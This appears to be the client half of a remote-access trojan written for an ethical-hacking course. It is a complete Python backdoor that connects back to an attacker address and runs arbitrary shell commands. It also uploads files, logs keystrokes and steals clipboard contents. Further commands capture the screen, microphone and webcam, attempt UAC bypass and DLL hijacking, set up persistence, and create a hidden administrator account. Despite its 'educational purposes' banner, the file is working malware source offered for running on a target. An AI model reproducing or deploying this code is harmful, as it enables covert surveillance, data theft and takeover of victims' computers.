################################################
# Backdoor Client (Target Machine)             #
# Class: DES484 Ethical Hacking                #
# WARNING: For Educational Purposes Only!      #
#                                              #
# USAGE: Run this on the TARGET machine        #
# This will connect back to the attacker       #
################################################

# Import necessary Python modules
import socket
import time
import subprocess
import json
import os
import sys

# Import feature modules (with fallback if not available)
try:
    from features.keylogger import Keylogger, FallbackKeylogger, PYNPUT_AVAILABLE
    from features.privilege_escalation import PrivilegeEscalation
    from features.media_capture_tool import ScreenCapture, AudioCapture, WebcamCapture, ScreenRecorder
    from features.network_discovery import NetworkDiscovery
    from features.clipboard_stealer import ClipboardStealer, FallbackClipboardStealer, PYPERCLIP_AVAILABLE
    FEATURES_AVAILABLE = True
except ImportError:
    FEATURES_AVAILABLE = False
    print("[!] Feature modules not found. Some features will be unavailable.")


class BackdoorClient:
    """Backdoor client with advanced features"""
    
    def __init__(self, host='192.168.0.100', port=5555):
        """
        Initialize the backdoor client (target-side)
        
        Args:
            host: IP address of attacker's server to connect to
            port: Port number of attacker's server
        """
        # Attacker's server address
        self.host = host
        self.port = port
        # Socket for connecting to attacker
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Initialize feature modules if available
        if FEATURES_AVAILABLE:
            # Keylogger for capturing keystrokes (uses pynput or fallback)
            self.keylogger = Keylogger() if PYNPUT_AVAILABLE else FallbackKeylogger()
            # Privilege escalation tools (Windows-focused)
            self.priv_esc = PrivilegeEscalation()
            # Screen capture for screenshots
            self.screen_capture = ScreenCapture()
            # Audio recording capabilities
            self.audio_capture = AudioCapture()
            # Webcam capture for images/video
            self.webcam_capture = WebcamCapture()
            # Screen video recording
            self.screen_recorder = ScreenRecorder()
            # Network discovery and scanning
            self.network_discovery = NetworkDiscovery()
            # Clipboard monitoring and stealing
            self.clipboard_stealer = ClipboardStealer() if PYPERCLIP_AVAILABLE else FallbackClipboardStealer()
        else:
            # Set all features to None if modules not available
            self.keylogger = None
            self.priv_esc = None
            self.screen_capture = None
            self.audio_capture = None
            self.webcam_capture = None
            self.screen_recorder = None
            self.network_discovery = None
            self.clipboard_stealer = None
    
    def reliable_send(self, data):
        """
        Send data reliably to the attacker machine
        
        Converts data to JSON format and encodes to bytes before sending.
        
        Args:
            data: Any JSON-serializable data to send to attacker
        """
        try:
            jsondata = json.dumps(data)
            self.socket.send(jsondata.encode())
        except Exception as e:
            print(f"[!] Error sending data: {e}")
    
    def reliable_recv(self):
        """
        Receive data reliably from the attacker machine
        
        Receives data in chunks and attempts to parse as JSON.
        Continues receiving until valid JSON is obtained.
        
        Returns:
            Parsed JSON data from attacker, or None if error occurs
        """
        data = ''
        while True:
            try:
                data = data + self.socket.recv(1024).decode().rstrip()
                return json.loads(data)
            except ValueError:
                continue
            except Exception as e:
                print(f"[!] Error receiving data: {e}")
                return None
    
    def upload_file(self, file_name):
        """
        Upload a file from target machine to attacker
        
        Reads the specified file and sends its binary content to attacker.
        This is called when attacker uses 'download' command.
        
        Args:
            file_name: Path to the file on target machine to upload
        """
        try:
            with open(file_name, 'rb') as f:
                self.socket.send(f.read())
        except Exception as e:
            self.reliable_send(f"Error uploading file: {str(e)}")
    
    def download_file(self, file_name):
        """
        Download a file from attacker to target machine
        
        Receives file content in chunks and saves to target machine.
        This is called when attacker uses 'upload' command.
        
        Args:
            file_name: Path where file should be saved on target machine
        """
        try:
            with open(file_name, 'wb') as f:
                self.socket.settimeout(1)
                chunk = self.socket.recv(1024)
                while chunk:
                    f.write(chunk)
                    try:
                        chunk = self.socket.recv(1024)
                    except socket.timeout:
                        break
                self.socket.settimeout(None)
        except Exception as e:
            self.reliable_send(f"Error downloading file: {str(e)}")
    
    def handle_command(self, command):
        """
        Handle received commands from attacker with enhanced features
        
        This is the main command dispatcher that routes commands to appropriate
        feature modules. Supports basic file operations, keylogging, privilege
        escalation, media capture, network discovery, and clipboard stealing.
        
        Args:
            command: Command string received from attacker
            
        Returns:
            'quit' to close connection, 'continue' to keep connection alive
        """
        try:
            # Basic commands
            if command == 'quit':
                return 'quit'
            
            elif command == 'clear':
                return 'continue'
            
            elif command[:3] == 'cd ':
                try:
                    os.chdir(command[3:])
                    self.reliable_send(f"Changed directory to: {os.getcwd()}")
                except Exception as e:
                    self.reliable_send(f"Error: {str(e)}")
                return 'continue'
            
            elif command[:8] == 'download':
                self.upload_file(command[9:])
                return 'continue'
            
            elif command[:6] == 'upload':
                self.download_file(command[7:])
                return 'continue'
            
            # Enhanced Features
            elif command == 'help':
                self.send_advanced_help()
                return 'continue'
            

            # Keylogger commands

            # start keylogger
            elif command == 'keylog_start':
                if self.keylogger:
                    result = self.keylogger.start()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Keylogger feature not available")
                return 'continue'
            
            # stop keylogger
            elif command == 'keylog_stop':
                if self.keylogger:
                    result = self.keylogger.stop()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Keylogger feature not available")
                return 'continue'
            
            # dump keylogger logs and download file
            elif command == 'keylog_dump':
                if self.keylogger:
                    # First, save any buffered content
                    if hasattr(self.keylogger, 'save_log'):
                        self.keylogger.save_log()
                    
                    # Get the log file path
                    log_file = self.keylogger.log_file
                    
                    # Check if log file exists and has content
                    if os.path.exists(log_file) and os.path.getsize(log_file) > 0:
                        # Send confirmation message
                        self.reliable_send(f"Keylog file ready: {log_file}")
                        # Automatically upload the file to attacker
                        self.upload_file(log_file)
                    else:
                        self.reliable_send("No keylog file found or file is empty")
                else:
                    self.reliable_send("Keylogger feature not available")
                return 'continue'
            
            # clear keylogger logs
            elif command == 'keylog_clear':
                if self.keylogger:
                    result = self.keylogger.clear_logs()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Keylogger feature not available")
                return 'continue'
            
            # manual log (fallback keylogger)
            elif command.startswith('keylog_manual'):
                if self.keylogger:
                    parts = command.split(' ', 1)
                    if len(parts) > 1:
                        text = parts[1]
                        result = self.keylogger.log_manual(text)
                        self.reliable_send(result)
                    else:
                        self.reliable_send("Usage: keylog_manual <text to log>")
                else:
                    self.reliable_send("Keylogger feature not available")
                return 'continue'
            
            # check keylogger status
            elif command == 'keylog_status':
                if self.keylogger:
                    status = self.keylogger.get_status()
                    self.reliable_send(json.dumps(status, indent=2))
                else:
                    self.reliable_send("Keylogger feature not available")
                return 'continue'
            
            # Privilege escalation commands
            
            # Check current privileges
            elif command == 'priv_check':
                if self.priv_esc:
                    status = self.priv_esc.get_status()
                    self.reliable_send(json.dumps(status, indent=2))
                else:
                    self.reliable_send("Privilege escalation feature not available")
                return 'continue'
            
            # Comprehensive privilege enumeration
            elif command == 'priv_enum':
                if self.priv_esc:
                    if self.priv_esc.system != 'Windows':
                        self.reliable_send("Privilege escalation module only supports Windows")
                    else:
                        result = f"""
=== Windows Privilege Enumeration ===

UAC Status:
{json.dumps(self.priv_esc.check_uac_status(), indent=2)}

Service Permissions:
{self.priv_esc.check_service_permissions()}

System Information:
{self.priv_esc.get_system_info()[:500]}"""
                        self.reliable_send(result)
                else:
                    self.reliable_send("Privilege escalation feature not available")
                return 'continue'
            
            # List running services
            elif command == 'priv_services':
                if self.priv_esc:
                    result = self.priv_esc.enumerate_services()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Privilege escalation feature not available")
                return 'continue'
            
            # Check scheduled tasks
            elif command == 'priv_tasks':
                if self.priv_esc:
                    result = self.priv_esc.check_scheduled_tasks()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Privilege escalation feature not available")
                return 'continue'
            
            # Find sensitive files
            elif command == 'priv_sensitive':
                if self.priv_esc:
                    result = self.priv_esc.find_sensitive_files()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Privilege escalation feature not available")
                return 'continue'
            
            # Find weak file permissions
            elif command == 'priv_weak_perms':
                if self.priv_esc:
                    result = self.priv_esc.exploit_weak_file_permissions()
                    if isinstance(result, list):
                        self.reliable_send("Exploitable Files:\n" + "\n".join(result))
                    else:
                        self.reliable_send(str(result))
                else:
                    self.reliable_send("Privilege escalation feature not available")
                return 'continue'
            
            # Comprehensive escalation scan
            elif command == 'priv_scan':
                if self.priv_esc:
                    result = self.priv_esc.comprehensive_escalation_scan()
                    self.reliable_send(json.dumps(result, indent=2))
                else:
                    self.reliable_send("Privilege escalation feature not available")
                return 'continue'
            
            # Windows UAC bypass attempt
            elif command == 'priv_uac_bypass':
                if self.priv_esc:
                    result = self.priv_esc.attempt_uac_bypass()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Privilege escalation feature not available")
                return 'continue'
            
            # DLL hijacking opportunities (Windows)
            elif command == 'priv_dll_hijack':
                if self.priv_esc:
                    result = self.priv_esc.attempt_dll_hijacking()
                    if isinstance(result, list):
                        self.reliable_send("DLL Hijacking Opportunities:\n" + "\n".join(result[:30]))
                    else:
                        self.reliable_send(str(result))
                else:
                    self.reliable_send("Privilege escalation feature not available")
                return 'continue'
            
            # Create persistence mechanism
            elif command.startswith('priv_persist'):
                if self.priv_esc:
                    parts = command.split()
                    payload_path = parts[1] if len(parts) > 1 else None
                    result = self.priv_esc.create_persistence_mechanism(payload_path)
                    self.reliable_send(result)
                else:
                    self.reliable_send("Privilege escalation feature not available")
                return 'continue'
            
            # Create backdoor user (requires admin)
            elif command.startswith('priv_user'):
                if self.priv_esc:
                    parts = command.split()
                    username = parts[1] if len(parts) > 1 else "support"
                    password = parts[2] if len(parts) > 2 else "P@ssw0rd123"
                    result = self.priv_esc.create_backdoor_user(username, password)
                    self.reliable_send(result)
                else:
                    self.reliable_send("Privilege escalation feature not available")
                return 'continue'
            
            # Read admin-protected file
            elif command.startswith('priv_read_file '):
                if self.priv_esc:
                    file_path = command[15:].strip()  # Remove 'priv_read_file '
                    if file_path:
                        result = self.priv_esc.read_admin_file(file_path)
                        if result['success']:
                            response = f"[+] File read successfully using {result['method']}\n"
                            response += f"[+] File: {file_path}\n"
                            response += f"[+] Content length: {len(result['content'])} characters\n"
                            response += "=" * 60 + "\n"
                            response += result['content']
                            response += "\n" + "=" * 60
                            self.reliable_send(response)
                        else:
                            self.reliable_send(f"[-] Failed to read file: {result['error']}")
                    else:
                        self.reliable_send("Usage: priv_read_file <file_path>")
                else:
                    self.reliable_send("Privilege escalation feature not available")
                return 'continue'
            
            # Read admin-protected binary file
            elif command.startswith('priv_read_binary '):
                if self.priv_esc:
                    file_path = command[17:].strip()  # Remove 'priv_read_binary '
                    if file_path:
                        result = self.priv_esc.read_admin_file_binary(file_path)
                        if result['success']:
                            response = f"[+] Binary file read successfully using {result['method']}\n"
                            response += f"[+] File: {file_path}\n"
                            response += f"[+] File size: {result['file_size']} bytes\n"
                            response += f"[+] Base64 length: {len(result['content_base64'])} characters\n"
                            response += "=" * 60 + "\n"
                            response += "Base64 Content (first 500 chars):\n"
                            response += result['content_base64'][:500]
                            if len(result['content_base64']) > 500:
                                response += f"\n... ({len(result['content_base64']) - 500} more characters)"
                            response += "\n" + "=" * 60
                            self.reliable_send(response)
                        else:
                            self.reliable_send(f"[-] Failed to read binary file: {result['error']}")
                    else:
                        self.reliable_send("Usage: priv_read_binary <file_path>")
                else:
                    self.reliable_send("Privilege escalation feature not available")
                return 'continue'
            
            # List admin-protected directory
            elif command.startswith('priv_list_dir '):
                if self.priv_esc:
                    dir_path = command[14:].strip()  # Remove 'priv_list_dir '
                    if dir_path:
                        result = self.priv_esc.list_admin_directory(dir_path)
                        if result['success']:
                            response = f"[+] Directory listed successfully using {result['method']}\n"
                            response += f"[+] Directory: {dir_path}\n"
                            response += f"[+] Directories: {len(result['directories'])}, Files: {len(result['files'])}\n"
                            response += "=" * 60 + "\n"
                            
                            if result['directories']:
                                response += "DIRECTORIES:\n"
                                for d in result['directories'][:50]:  # Limit to 50
                                    response += f"  [DIR]  {d['name']}\n"
                                if len(result['directories']) > 50:
                                    response += f"  ... and {len(result['directories']) - 50} more directories\n"
                                response += "\n"
                            
                            if result['files']:
                                response += "FILES:\n"
                                for f in result['files'][:50]:  # Limit to 50
                                    size_str = f"{f['size']} bytes" if isinstance(f['size'], int) else f['size']
                                    response += f"  [FILE] {f['name']} ({size_str})\n"
                                if len(result['files']) > 50:
                                    response += f"  ... and {len(result['files']) - 50} more files\n"
                            
                            response += "=" * 60
                            self.reliable_send(response)
                        else:
                            self.reliable_send(f"[-] Failed to list directory: {result['error']}")
                    else:
                        self.reliable_send("Usage: priv_list_dir <directory_path>")
                else:
                    self.reliable_send("Privilege escalation feature not available")
                return 'continue'
            

            # Screen capture commands

            # single screenshot
            elif command == 'screenshot':
                if self.screen_capture:
                    result = self.screen_capture.capture_screenshot()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Screen capture feature not available")
                return 'continue'
            
            # multi screenshot
            elif command.startswith('screenshot_multi'):
                if self.screen_capture:
                    parts = command.split()
                    count = int(parts[1]) if len(parts) > 1 else 5
                    interval = int(parts[2]) if len(parts) > 2 else 2
                    result = self.screen_capture.capture_multiple(count, interval)
                    self.reliable_send(result)
                else:
                    self.reliable_send("Screen capture feature not available")
                return 'continue'
            
            # list screenshots
            elif command == 'screenshot_list':
                if self.screen_capture:
                    result = self.screen_capture.list_screenshots()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Screen capture feature not available")
                return 'continue'
            

            # Audio capture commands

            # start audio recording (background)
            elif command == 'audio_start':
                if self.audio_capture:
                    result = self.audio_capture.start_audio()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Audio capture feature not available")
                return 'continue'
            
            # stop audio recording
            elif command == 'audio_stop':
                if self.audio_capture:
                    result = self.audio_capture.stop_audio()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Audio capture feature not available")
                return 'continue'
            
            # check audio recording status
            elif command == 'audio_status':
                if self.audio_capture:
                    result = self.audio_capture.get_audio_status()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Audio capture feature not available")
                return 'continue'
            
            # record audio (legacy - fixed duration)
            elif command.startswith('audio_record'):
                if self.audio_capture:
                    parts = command.split()
                    duration = int(parts[1]) if len(parts) > 1 else 10
                    result = self.audio_capture.record_audio(duration)
                    self.reliable_send(result)
                else:
                    self.reliable_send("Audio capture feature not available")
                return 'continue'
            
            # list audio recordings
            elif command == 'audio_list':
                if self.audio_capture:
                    result = self.audio_capture.list_recordings()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Audio capture feature not available")
                return 'continue'
            

            # Screen recording commands

            # record screen
            elif command.startswith('record_screen'):
                if self.screen_recorder:
                    parts = command.split()
                    duration = int(parts[1]) if len(parts) > 1 else 10
                    fps = int(parts[2]) if len(parts) > 2 else 15
                    result = self.screen_recorder.record_screen(duration=duration, fps=fps)
                    self.reliable_send(result)
                else:
                    self.reliable_send("Screen recording feature not available")
                return 'continue'
            
            # background screen recording commands
            elif command == 'record_start':
                if self.screen_recorder:
                    parts = command.split()
                    max_duration = int(parts[1]) if len(parts) > 1 else 3600
                    result = self.screen_recorder.start_background_recording(max_duration=max_duration)
                    self.reliable_send(result)
                else:
                    self.reliable_send("Screen recording feature not available")
                return 'continue'
            
            # stop background recording
            elif command == 'record_stop':
                if self.screen_recorder:
                    result = self.screen_recorder.stop_recording()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Screen recording feature not available")
                return 'continue'
            
            # check recording status
            elif command == 'record_status':
                if self.screen_recorder:
                    result = self.screen_recorder.get_recording_status()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Screen recording feature not available")
                return 'continue'
            
            # list screen recordings
            elif command == 'record_list':
                if self.screen_recorder:
                    result = self.screen_recorder.list_recordings()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Screen recording feature not available")
                return 'continue'
            

            # Webcam capture commands

            # start webcam video recording (background)
            elif command == 'webcam_start':
                if self.webcam_capture:
                    result = self.webcam_capture.start_webcam_recording()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Webcam capture feature not available")
                return 'continue'
            
            # stop webcam recording
            elif command == 'webcam_stop':
                if self.webcam_capture:
                    result = self.webcam_capture.stop_webcam()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Webcam capture feature not available")
                return 'continue'
            
            # check webcam recording status
            elif command == 'webcam_status':
                if self.webcam_capture:
                    result = self.webcam_capture.get_webcam_status()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Webcam capture feature not available")
                return 'continue'
            
            # capture webcam image (legacy - single snapshot)
            elif command == 'webcam_snap':
                if self.webcam_capture:
                    result = self.webcam_capture.capture_image()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Webcam capture feature not available")
                return 'continue'
            
            # list webcam images and videos
            elif command == 'webcam_list':
                if self.webcam_capture:
                    result = self.webcam_capture.list_images()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Webcam capture feature not available")
                return 'continue'

            # Network discovery commands

            # network information
            elif command == 'net_info':
                if self.network_discovery:
                    info = self.network_discovery.get_network_info()
                    result = json.dumps(info, indent=2)
                    self.reliable_send(result)
                else:
                    self.reliable_send("Network discovery feature not available")
                return 'continue'
            
            # scan local network
            elif command == 'net_scan':
                if self.network_discovery:
                    result = self.network_discovery.discover_local_network()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Network discovery feature not available")
                return 'continue'
            
            # active connections
            elif command == 'net_connections':
                if self.network_discovery:
                    result = self.network_discovery.get_active_connections()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Network discovery feature not available")
                return 'continue'
            
            # port scan host
            elif command.startswith('net_portscan'):
                if self.network_discovery:
                    parts = command.split()
                    if len(parts) > 1:
                        host = parts[1]
                        result = self.network_discovery.scan_common_ports(host)
                        self.reliable_send(f"Open ports on {host}: {result}")
                    else:
                        self.reliable_send("Usage: net_portscan <host>")
                else:
                    self.reliable_send("Network discovery feature not available")
                return 'continue'

            # network public IP
            elif command == 'net_public_ip':
                if self.network_discovery:
                    result = self.network_discovery.get_public_ip()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Network discovery feature not available")
                return 'continue'
            
            # check internet connectivity
            elif command == 'net_check_internet':
                if self.network_discovery:
                    result = self.network_discovery.check_internet_connectivity()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Network discovery feature not available")
                return 'continue'
            
            # Clipboard stealer commands
            
            # start clipboard monitoring
            elif command == 'clipboard_start':
                if self.clipboard_stealer:
                    result = self.clipboard_stealer.start()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Clipboard stealer feature not available")
                return 'continue'
            
            # stop clipboard monitoring
            elif command == 'clipboard_stop':
                if self.clipboard_stealer:
                    result = self.clipboard_stealer.stop()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Clipboard stealer feature not available")
                return 'continue'
            
            # get clipboard status
            elif command == 'clipboard_status':
                if self.clipboard_stealer:
                    status = self.clipboard_stealer.get_status()
                    self.reliable_send(json.dumps(status, indent=2))
                else:
                    self.reliable_send("Clipboard stealer feature not available")
                return 'continue'
            
            # get latest clipboard content
            elif command == 'clipboard_get':
                if self.clipboard_stealer:
                    result = self.clipboard_stealer.get_latest_clipboard()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Clipboard stealer feature not available")
                return 'continue'
            
            # set clipboard content
            elif command.startswith('clipboard_set '):
                if self.clipboard_stealer:
                    content = command[14:]  # Remove 'clipboard_set '
                    result = self.clipboard_stealer.set_clipboard(content)
                    self.reliable_send(result)
                else:
                    self.reliable_send("Clipboard stealer feature not available")
                return 'continue'
            
            # dump clipboard logs
            elif command == 'clipboard_dump':
                if self.clipboard_stealer:
                    log_file = self.clipboard_stealer.log_file
                    
                    # Check if log file exists and has content
                    if os.path.exists(log_file) and os.path.getsize(log_file) > 0:
                        # Send confirmation message
                        self.reliable_send(f"Clipboard log file ready: {log_file}")
                        # Automatically upload the file to attacker
                        self.upload_file(log_file)
                    else:
                        self.reliable_send("No clipboard log file found or file is empty")
                else:
                    self.reliable_send("Clipboard stealer feature not available")
                return 'continue'
            
            # clear clipboard logs
            elif command == 'clipboard_clear':
                if self.clipboard_stealer:
                    result = self.clipboard_stealer.clear_logs()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Clipboard stealer feature not available")
                return 'continue'
            
            # list clipboard log files
            elif command == 'clipboard_list':
                if self.clipboard_stealer:
                    result = self.clipboard_stealer.list_logs()
                    self.reliable_send(result)
                else:
                    self.reliable_send("Clipboard stealer feature not available")
                return 'continue'
            
            # System information
            elif command == 'sysinfo':
                result = self.get_system_info()
                self.reliable_send(result)
                return 'continue'
            
            # Default: execute as shell command
            else:
                execute = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
                result = execute.stdout.read() + execute.stderr.read()
                result = result.decode()
                self.reliable_send(result)
                return 'continue'
        
        except Exception as e:
            self.reliable_send(f"Error executing command: {str(e)}")
            return 'continue'

    # Send advanced help information
    def send_advanced_help(self):
        """
        Send help information about all features to the attacker
        
        Provides comprehensive command reference for all available backdoor
        features including keylogger, privilege escalation, media capture, etc.
        """
        help_text = """
        === Enhanced Backdoor Commands ===

        BASIC COMMANDS:
        help                - Show this help message
        sysinfo             - Display system information
        cd <dir>            - Change directory
        download <file>     - Download file from target
        upload <file>       - Upload file to target
        quit                - Exit backdoor

        KEYLOGGER:
        keylog_start        - Start keylogger
        keylog_stop         - Stop keylogger
        keylog_dump         - Download keylog file (saved as keylog_dump_TIMESTAMP.txt)
        keylog_clear        - Clear keylog file
        keylog_status       - Check keylogger status
        keylog_manual <text> - Manually log text (fallback mode)

        PRIVILEGE ESCALATION:
        priv_check          - Check current privileges and user information
        priv_enum           - Enumerate Windows privilege escalation vectors
        priv_scan           - Comprehensive escalation scan (all vectors)
        priv_services       - List running Windows services and permissions
        priv_tasks          - List Windows scheduled tasks
        priv_sensitive      - Find sensitive files (credentials, keys, configs)
        priv_weak_perms     - Find exploitable file permissions
        priv_uac_bypass     - Attempt UAC bypass (Windows only)
        priv_dll_hijack     - Find DLL hijacking opportunities (Windows)
        priv_persist [path] - Create persistence mechanism
        priv_user [user] [pass] - Create backdoor user (requires admin)
        priv_read_file <path> - Read admin-protected file (attempts elevation)
        priv_read_binary <path> - Read admin-protected binary file (base64)
        priv_list_dir <path> - List admin-protected directory contents

        SCREEN & MEDIA:
        screenshot          - Capture single screenshot
        screenshot_multi <count> <interval> - Capture multiple screenshots
        screenshot_list     - List captured screenshots
        
        audio_start         - Start background audio recording
        audio_stop          - Stop audio recording and save
        audio_status        - Check audio recording status
        audio_record <sec>  - Record audio for specific duration (default 10s)
        audio_list          - List audio recordings
        
        record_start <max>  - Start background screen recording (max duration in seconds)
        record_stop         - Stop screen recording and save
        record_status       - Check screen recording status
        record_screen <sec> <fps> - Record screen for specific duration (default 10s, 15fps)
        record_list         - List screen recordings
        
        webcam_start        - Start background webcam recording
        webcam_stop         - Stop webcam recording and save
        webcam_status       - Check webcam recording status
        webcam_snap         - Capture single webcam image
        webcam_list         - List webcam images and videos

        NETWORK DISCOVERY:
        net_info            - Display network information
        net_scan            - Scan local network for hosts
        net_connections     - Show active network connections
        net_portscan <host> - Scan common ports on host
        net_public_ip       - Get public IP address
        net_check_internet  - Check internet connectivity

        CLIPBOARD STEALER:
        clipboard_start     - Start monitoring clipboard
        clipboard_stop      - Stop monitoring clipboard
        clipboard_status    - Check clipboard monitor status
        clipboard_get       - Get current clipboard content
        clipboard_set <text> - Set clipboard content
        clipboard_dump      - Download clipboard log file
        clipboard_clear     - Clear clipboard logs
        clipboard_list      - List all clipboard log files

        Note: Some features require additional libraries (pynput, PIL, pyaudio, opencv-python, pyperclip)
        """
        self.reliable_send(help_text)
    
    # get system information
    def get_system_info(self):
        """
        Gather comprehensive system information from target machine
        
        Collects hostname, OS details, Python version, current directory,
        user information, network IP, and privilege status.
        
        Returns:
            Formatted string containing system information
        """
        import platform
        
        info = f"""
            === System Information ===
            Hostname: {socket.gethostname()}
            System: {platform.system()}
            Release: {platform.release()}
            Version: {platform.version()}
            Machine: {platform.machine()}
            Processor: {platform.processor()}
            Python: {platform.python_version()}
            Current Directory: {os.getcwd()}
            Current User: {os.getenv('USER') or os.getenv('USERNAME')}
            """
        if self.network_discovery:
            info += f"\nLocal IP: {self.network_discovery.local_ip}"
        
        if self.priv_esc:
            info += f"\nPrivileged: {self.priv_esc.is_admin}"
        
        return info

    # Main shell function for command execution
    def shell(self):
        """
        Main shell function for command execution
        
        Continuously receives commands from attacker and executes them
        using handle_command(). Runs until 'quit' command received.
        """
        while True:
            command = self.reliable_recv()
            if command is None:
                break
            
            result = self.handle_command(command)
            if result == 'quit':
                break

    # Establish connection to attacker machine (reverse shell)
    def connection(self):
        """
        Establish connection to attacker machine (reverse shell)
        
        Continuously attempts to connect back to the attacker's server.
        Implements automatic reconnection with 20-second delay between attempts.
        Once connected, enters the command execution shell.
        """
        while True:
            time.sleep(20)  # Wait before reconnecting
            try:
                print(f"[*] Attempting to connect to {self.host}:{self.port}...")
                self.socket.connect((self.host, self.port))
                print("[+] Connection established!")
                self.shell()
                self.socket.close()
                break
            except Exception as e:
                print(f"[!] Connection failed: {e}")
                print("[*] Retrying...")
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


# Main execution
if __name__ == "__main__":
    print("=" * 70)
    print("  Backdoor Client - TARGET SIDE")
    print("  This program connects BACK to the attacker's server")
    print("  WARNING: For Educational Purposes Only!")
    print("=" * 70)
    
    # Configuration - Change these to match your attacker machine
    ATTACKER_HOST = '192.168.0.100'  # Change to attacker's IP address
    ATTACKER_PORT = 5557            # Must match port in server.py
    
    print(f"\n[*] Configured to connect to: {ATTACKER_HOST}:{ATTACKER_PORT}")
    print("[*] Starting connection attempts...")
    print("=" * 70)
    
    # Create and start backdoor client
    client = BackdoorClient(ATTACKER_HOST, ATTACKER_PORT)
    client.connection()
